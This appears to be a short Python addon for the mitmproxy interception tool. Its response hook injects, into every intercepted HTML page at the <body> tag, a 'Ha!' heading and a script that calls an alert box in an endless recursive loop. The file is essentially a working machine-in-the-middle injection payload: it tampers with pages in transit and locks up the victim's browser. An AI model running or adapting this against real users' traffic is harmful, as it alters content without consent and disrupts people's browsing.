from mitmproxy import http

def request(flow: http.HTTPFlow) -> None:
    """request"""

def response(flow: http.HTTPFlow) -> None:
    from bs4 import BeautifulSoup
    # replace "replace" with bs4
    if flow.response and flow.response.content:
        flow.response.content = flow.response.content.replace("<body>".encode(), """<body>
        <h1>Ha!</h1>
        <script>
            function altf() {
                alert("HA!")
                altf()
            }
            alert("HA!")
            altf()
        </script>
        """.encode())